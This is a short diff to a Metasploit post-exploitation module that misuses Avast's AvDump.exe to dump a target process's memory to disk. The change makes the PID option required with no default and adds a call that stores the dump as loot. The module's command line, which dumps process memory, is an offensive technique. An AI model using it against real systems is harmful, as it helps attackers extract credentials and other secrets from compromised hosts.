@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Post
     ))
 
     register_options ( [
-        OptString.new('PID', [true, 'specify pid to dump', ""]),
+        OptString.new('PID', [true, 'specify pid to dump']),
         OptString.new('DUMP_PATH', [true, 'specify location to write dump file to', "C:\\Users\\Public\\tmp.dmp"])
     ])
   end
@@ -37,6 +37,7 @@ class MetasploitModule < Msf::Post
     if check_for_dump
         print_status("executing Avast mem dump utility against #{datastore['PID']} to #{datastore['DUMP_PATH']}")
         result = cmd_exec("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe --pid #{datastore['PID']} --exception_ptr 0 --thread_id 0 --dump_file #{datastore['DUMP_PATH']} --min_interval 0")
+        store_loot("host.avast.memdump", "binary/db", session, "avast_memdump")
         print_status(result)
     end
   end
